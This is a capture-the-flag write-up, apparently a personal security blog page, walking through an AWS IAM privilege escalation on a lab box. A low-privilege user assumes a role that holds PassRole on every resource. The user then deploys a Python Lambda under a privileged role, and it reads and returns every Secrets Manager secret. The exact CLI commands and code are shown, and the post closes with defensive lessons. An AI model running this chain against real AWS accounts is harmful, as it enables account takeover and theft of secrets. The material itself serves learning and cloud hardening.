@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Assume — PassRole into Lambda, Lambda into Secrets Manager | Shashank Patil</title>
+<meta name="description" content="A pure AWS IAM box on Hack Smarter: a low-priv user with sts:AssumeRole on * pivots into a role holding iam:PassRole, then abuses it to run a Lambda as a privileged role and read the flag out of Secrets Manager.">
+
+<style>
+
+body{
+background:black;
+color:#00ff9c;
+font-family:monospace;
+margin:0;
+padding:0;
+}
+
+nav{
+padding:15px;
+border-bottom:1px solid #00ff9c;
+}
+
+nav a{
+color:#00ff9c;
+margin-right:20px;
+text-decoration:none;
+}
+
+nav a:hover{
+text-decoration:underline;
+}
+
+main{
+max-width:800px;
+margin:0 auto;
+padding:40px 20px 80px 20px;
+line-height:1.75;
+font-size:15px;
+}
+
+h1{
+line-height:1.3;
+}
+
+h2{
+margin-top:55px;
+border-bottom:1px solid #00ff9c;
+padding-bottom:8px;
+}
+
+h3{
+margin-top:35px;
+}
+
+a{
+color:#00ff9c;
+}
+
+.meta{
+opacity:0.65;
+font-size:13px;
+margin-bottom:40px;
+}
+
+code{
+background:#062;
+color:#c9ffe8;
+padding:1px 5px;
+}
+
+pre{
+border:1px solid #00ff9c;
+padding:15px;
+overflow-x:auto;
+font-size:13px;
+line-height:1.5;
+}
+
+pre code{
+background:none;
+color:#00ff9c;
+padding:0;
+}
+
+blockquote{
+border-left:3px solid #00ff9c;
+margin:30px 0;
+padding:5px 0 5px 20px;
+opacity:0.9;
+}
+
+ul{
+padding-left:20px;
+}
+
+li{
+margin-bottom:8px;
+}
+
+footer{
+border-top:1px solid #00ff9c;
+margin-top:60px;
+padding-top:20px;
+font-size:13px;
+opacity:0.8;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<nav>
+<a href="../index.html">Home</a>
+<a href="../blog.html">Blog</a>
+<a href="https://github.com/b17w1z4rd">GitHub</a>
+</nav>
+
+<main>
+
+<h1>$ cat assume.md</h1>
+
+<p class="meta">
+Hack Smarter &middot; Easy &middot; AWS / cloud
+</p>
+
+<p>
+Another pure AWS IAM box &mdash; CLI only, no VPN, no shells. You start with low-priv keys for a user who can't read Secrets Manager, and the escalation rides on two over-scoped IAM actions. The chain: read your own policy to find <strong><code>sts:AssumeRole</code> on <code>*</code></strong> -&gt; enumerate roles and find one that trusts you and one that trusts only Lambda -&gt; the assumable role holds <strong><code>iam:PassRole</code> on <code>*</code></strong> plus full Lambda -&gt; the Lambda-only role is the one that can read the secret -&gt; so deploy a function and <em>pass it the privileged role as its execution role</em>, letting the function read the flag for you. A classic <strong>PassRole -&gt; Lambda</strong> privilege escalation.
+</p>
+
+<p>
+<em>AWS keys and the STS session token below are redacted &mdash; Hack Smarter's hard rule for cloud walkthroughs, and a good habit anyway (live-looking keys in a public repo trip Amazon's automated scanners). Everything else is the intended path.</em>
+</p>
+
+<h2>$ setup</h2>
+
+<p>
+Wire the given keys into a named profile and check the objective first &mdash; and, as the username hints, it's denied:
+</p>
+
+<pre><code>aws configure --profile chris         # keys, us-east-1, json
+aws sts get-caller-identity --profile chris
+# Arn: arn:aws:iam::&lt;ACCOUNT&gt;:user/chris-lab
+
+aws secretsmanager list-secrets --profile chris --region us-east-1
+# AccessDeniedException  (no ListSecrets, as expected)</code></pre>
+
+<h2>$ read your own policy</h2>
+
+<p>
+chris can read IAM. His attached policy is the whole map &mdash; and it's loud:
+</p>
+
+<pre><code>aws iam get-policy-version \
+  --policy-arn arn:aws:iam::$ACCT:policy/cg-chris-policy-lab \
+  --version-id v1 --profile chris</code></pre>
+
+<pre><code>{
+  "Action": [ "sts:AssumeRole", "iam:List*", "iam:Get*" ],
+  "Effect": "Allow",
+  "Resource": "*"
+}</code></pre>
+
+<p>
+<code>sts:AssumeRole</code> on <code>Resource: "*"</code>. chris can assume <em>any</em> role in the account &mdash; provided the role's own trust policy lets him. That flips the question from "what can chris do" to "which role will accept chris?"
+</p>
+
+<h2>$ enumerate the roles</h2>
+
+<p>
+Two custom roles stand out from the service-linked noise (filter for the CloudGoat <code>cg-</code> prefix). Read both trust policies &mdash; this is the crux of the box:
+</p>
+
+<pre><code>aws iam list-roles --profile chris \
+  --query "Roles[?starts_with(RoleName,'cg-')].RoleName"
+# cg-lambdaManager-role-lab
+# cg-debug-role-lab
+
+aws iam get-role --role-name cg-lambdaManager-role-lab --profile chris \
+  --query "Role.AssumeRolePolicyDocument"
+# Principal: { "AWS": ".../user/chris-lab" }         &lt;- trusts chris
+
+aws iam get-role --role-name cg-debug-role-lab --profile chris \
+  --query "Role.AssumeRolePolicyDocument"
+# Principal: { "Service": "lambda.amazonaws.com" }   &lt;- trusts Lambda only</code></pre>
+
+<p>
+So chris can assume <strong>lambdaManager</strong> directly, but <strong>debug</strong> &mdash; the role that turns out to hold access to the secret &mdash; can only ever be assumed by a Lambda function. That fence <em>is</em> the puzzle: to become debug, something has to run <em>as</em> debug, and only Lambda qualifies.
+</p>
+
+<h2>$ the privesc primitive</h2>
+
+<p>
+lambdaManager's policy is the lever. Full Lambda, and <code>iam:PassRole</code> on everything:
+</p>
+
+<pre><code>aws iam get-policy-version \
+  --policy-arn arn:aws:iam::$ACCT:policy/cg-lambdaManager-policy-lab \
+  --version-id v1 --profile chris
+# { "Action": [ "lambda:*", "iam:PassRole" ], "Resource": "*" }</code></pre>
+
+<p>
+<code>iam:PassRole</code> is the action that lets a principal hand a role to an AWS service. Scoped to <code>*</code>, it means lambdaManager can attach <em>any</em> role &mdash; including debug &mdash; to a Lambda function as its execution role. Paired with <code>lambda:CreateFunction</code> and <code>lambda:InvokeFunction</code>, that's a full escalation into debug's permissions. In production you scope <code>PassRole</code> to the specific roles a service is allowed to run as; <code>*</code> hands over everything.
+</p>
+
+<h2>$ exploitation</h2>
+
+<p>
+Assume lambdaManager and switch into its session:
+</p>
+
+<pre><code>aws sts assume-role \
+  --role-arn arn:aws:iam::$ACCT:role/cg-lambdaManager-role-lab \
+  --role-session-name pwn --profile chris
+# Credentials: AccessKeyId / SecretAccessKey / SessionToken
+
+export AWS_ACCESS_KEY_ID=&lt;REDACTED&gt;
+export AWS_SECRET_ACCESS_KEY=&lt;REDACTED&gt;
+export AWS_SESSION_TOKEN=&lt;REDACTED&gt;
+aws sts get-caller-identity
+# Arn: .../assumed-role/cg-lambdaManager-role-lab/pwn</code></pre>
+
+<p>
+Write a few lines of Python that read every secret, zip it, and deploy it &mdash; crucially, with <code>cg-debug-role-lab</code> as the <code>--role</code>. The function inherits debug's Secrets Manager access:
+</p>
+
+<pre><code>cat &gt; lambda_function.py &lt;&lt;'EOF'
+import boto3
+def lambda_handler(event, context):
+    sm = boto3.client('secretsmanager')
+    out = {}
+    for s in sm.list_secrets()['SecretList']:
+        out[s['Name']] = sm.get_secret_value(SecretId=s['Name'])['SecretString']
+    return out
+EOF
+zip function.zip lambda_function.py
+
+aws lambda create-function --function-name pwn --runtime python3.12 \
+  --role arn:aws:iam::$ACCT:role/cg-debug-role-lab \
+  --handler lambda_function.lambda_handler \
+  --zip-file fileb://function.zip --region us-east-1
+
+aws lambda invoke --function-name pwn --region us-east-1 response.json
+cat response.json</code></pre>
+
+<blockquote>
+If <code>create-function</code> returns <code>The role defined for the function cannot be assumed by Lambda</code>, that's IAM propagation lag &mdash; wait ~10&nbsp;s and re-run the same command. Remember the STS session env vars don't carry between terminals, and neither does <code>$ACCT</code> &mdash; re-export them in whatever shell you run the deploy from.
+</blockquote>
+
+<h2>$ flag</h2>
+
+<pre><code>aws lambda invoke --function-name pwn --region us-east-1 response.json
+cat response.json
+# { "cg-...-flag": "&lt;the flag string&gt;" }</code></pre>
+
+<p>
+The function ran with debug's identity, read a secret chris was never allowed to touch, and handed it back &mdash; full account compromise from a user who couldn't even call <code>ListSecrets</code>.
+</p>
+
+<h2>$ takeaway</h2>
+
+<ul>
+<li><strong>PassRole is a privilege-escalation primitive, not plumbing.</strong> The right to hand a role to a service is the right to <em>become</em> that role's permissions, as long as you also control something that service runs &mdash; Lambda, EC2, ECS, Glue. <code>iam:PassRole</code> on <code>*</code> next to <code>lambda:*</code> is game over.</li>
+<li><strong>A trust policy that names a service is still a door.</strong> debug trusting only <code>lambda.amazonaws.com</code> looks locked down &mdash; no human can assume it. But anyone who can create a Lambda and pass the role walks right in. Restricting who can assume a role means little if the service it trusts is one you can drive.</li>
+<li><strong>Scope PassRole tightly.</strong> Grant it only for the exact execution roles a principal legitimately needs, via explicit resource ARNs and ideally an <code>iam:PassedToService</code> condition. Never <code>Resource: "*"</code>.</li>
+<li><strong>In AWS, enumeration is the exploit.</strong> There was nothing to overflow or crack &mdash; the whole box was reading three policy documents and two trust relationships and noticing which grants were too wide.</li>
+</ul>
+
+<footer>
+<p>
+CTF handle <code>b17w1z4rd</code> &middot; <a href="https://github.com/b17w1z4rd">github.com/b17w1z4rd</a>
+</p>
+<p>
+<a href="../blog.html">&larr; back to all posts</a>
+</p>
+</footer>
+
+</main>
+
+</body>
+</html>
